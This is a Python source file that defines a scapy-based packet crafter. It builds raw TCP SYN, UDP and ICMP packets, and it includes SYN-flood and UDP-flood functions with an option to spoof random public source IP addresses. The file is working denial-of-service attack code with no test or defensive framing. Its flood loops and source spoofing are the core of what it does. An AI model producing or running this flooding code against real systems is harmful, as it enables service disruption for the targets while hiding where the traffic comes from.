import random
import struct
from typing import Optional

import structlog

logger = structlog.get_logger(__name__)


class PacketCrafter:
    PACKET_AVAILABLE = False

    @classmethod
    def init(cls) -> None:
        try:
            from scapy.all import conf, IP, TCP, UDP, ICMP, Raw, Ether
            cls.conf = conf
            cls.IP = IP
            cls.TCP = TCP
            cls.UDP = UDP
            cls.ICMP = ICMP
            cls.Raw = Raw
            cls.Ether = Ether
            cls.PACKET_AVAILABLE = True
            cls.conf.verb = 0
        except ImportError:
            logger.warning("scapy_not_available", message="Packet crafting disabled")
            cls.PACKET_AVAILABLE = False

    @classmethod
    def craft_tcp_syn(
        cls, src_ip: str, dst_ip: str, src_port: int, dst_port: int
    ) -> Optional[bytes]:
        if not cls.PACKET_AVAILABLE:
            return None
        try:
            ip = cls.IP(src=src_ip, dst=dst_ip)
            tcp = cls.TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(0, 4294967295))
            pkt = ip / tcp
            return bytes(pkt)
        except Exception as e:
            logger.debug("packet_craft_failed", error=str(e))
            return None

    @classmethod
    def craft_udp(
        cls, src_ip: str, dst_ip: str, src_port: int, dst_port: int, payload_size: int = 0
    ) -> Optional[bytes]:
        if not cls.PACKET_AVAILABLE:
            return None
        try:
            ip = cls.IP(src=src_ip, dst=dst_ip)
            udp = cls.UDP(sport=src_port, dport=dst_port)
            pkt = ip / udp
            if payload_size > 0:
                pkt = pkt / cls.Raw(load="\x00" * min(payload_size, 1400))
            return bytes(pkt)
        except Exception as e:
            logger.debug("packet_craft_failed", error=str(e))
            return None

    @classmethod
    def craft_icmp(
        cls, src_ip: str, dst_ip: str, payload_size: int = 0
    ) -> Optional[bytes]:
        if not cls.PACKET_AVAILABLE:
            return None
        try:
            ip = cls.IP(src=src_ip, dst=dst_ip)
            icmp = cls.ICMP()
            pkt = ip / icmp
            if payload_size > 0:
                pkt = pkt / cls.Raw(load="\x00" * min(payload_size, 1400))
            return bytes(pkt)
        except Exception as e:
            logger.debug("packet_craft_failed", error=str(e))
            return None

    @classmethod
    def send_raw(cls, pkt: bytes) -> bool:
        if not cls.PACKET_AVAILABLE:
            return False
        try:
            cls.conf.L3socket.send(cls.IP(pkt))
            return True
        except Exception:
            return False

    @classmethod
    def send_syn_flood(
        cls, dst_ip: str, dst_port: int, count: int = 1, spoof: bool = False
    ) -> int:
        if not cls.PACKET_AVAILABLE:
            return 0
        sent = 0
        for _ in range(count):
            src_ip = _random_ip() if spoof else "0.0.0.0"
            src_port = random.randint(1024, 65535)
            pkt = cls.craft_tcp_syn(src_ip, dst_ip, src_port, dst_port)
            if pkt and cls.send_raw(pkt):
                sent += 1
        return sent

    @classmethod
    def send_udp_flood(
        cls, dst_ip: str, dst_port: int, count: int = 1, payload_size: int = 0, spoof: bool = False
    ) -> int:
        if not cls.PACKET_AVAILABLE:
            return 0
        sent = 0
        for _ in range(count):
            src_ip = _random_ip() if spoof else "0.0.0.0"
            src_port = random.randint(1024, 65535)
            pkt = cls.craft_udp(src_ip, dst_ip, src_port, dst_port, payload_size)
            if pkt and cls.send_raw(pkt):
                sent += 1
        return sent


def _random_ip() -> str:
    while True:
        ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        if not ip.startswith("127.") and not ip.startswith("10.") and not ip.startswith("172.16.") and not ip.startswith("192.168."):
            return ip


PacketCrafter.init()
